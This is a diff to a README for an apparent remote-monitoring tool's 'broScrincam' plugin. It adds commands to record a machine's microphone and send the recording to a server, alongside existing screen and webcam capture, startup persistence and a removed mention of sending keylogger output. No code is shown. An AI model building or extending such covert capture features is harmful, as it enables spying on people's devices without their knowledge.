@@ -203,6 +203,7 @@ This comp will start with windows.
 This plugin is for:  
 - Take photos from a Webcam (not coded yet)  
 - Record video from a Webcam (not coded yet)  
+- Record microphone
 - Record screen (it should work)  
 *The function to record the screen should work, but in my case the server does NOT allow uploading the recording file because it is very large*  
 
@@ -246,8 +247,23 @@ boro-get broScrincam True /sendcamrecord
 > NOTE: It will be sent automatically.
 ---
 ```sh
-/stop: It will send the keylogger and then start recording again.
-boro-get broScrincam True /stop
+/startmicrecording: It will start recording the audio from the microphone.
+boro-get broScrincam True /startmicrecording
+```
+---
+```sh
+/stopmicrecord: It will stop and close the microphone recording.
+boro-get broScrincam True /stopmicrecord
+```
+> NOTE: It will not save or send the record.  
+---
+```sh
+/sendmicrecord: It will stop and send the microphone recording.
+boro-get broScrincam True /sendmicrecord
+```
+---
+```sh
+/stop: It will stop running.
 ```
 ---
 ### broReedit
